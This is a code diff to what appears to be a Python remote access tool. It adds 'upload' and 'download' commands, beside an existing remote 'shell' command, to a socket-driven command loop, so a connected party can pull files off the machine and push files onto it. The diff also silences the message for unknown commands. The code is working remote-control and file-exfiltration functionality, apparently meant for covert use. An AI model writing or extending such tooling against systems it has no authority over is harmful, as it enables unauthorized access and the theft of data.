@@ -57,6 +57,14 @@ class Windows(Computer):
   def ipconfig(self):
     return check_output(["ipconfig"]).decode('utf-8')
 
+def download(socket):
+  filename_src, filename_dst=socket.receive().split('*')
+  if os.path.isfile(filename_src):
+    socket.send('ok')
+    socket.send_file(filename_src, filename_dst)
+  else:
+    socket.send('File not found.')
+
 if __name__ == "__main__":
   try:
     port=int(argv[1])
@@ -86,11 +94,15 @@ if __name__ == "__main__":
         socket.send(system.ipconfig())
       case "shell":
         system.shell(socket)
+      case "upload":
+        socket.receive_file()
+      case "download":
+        download(socket)
       case "search":
         filename, path = socket.get_params()
         socket.send(system.search(filename,path))
       case "exit":
         using=False
       case _:
-        print("unknown")
+        pass
   socket.disconnect()
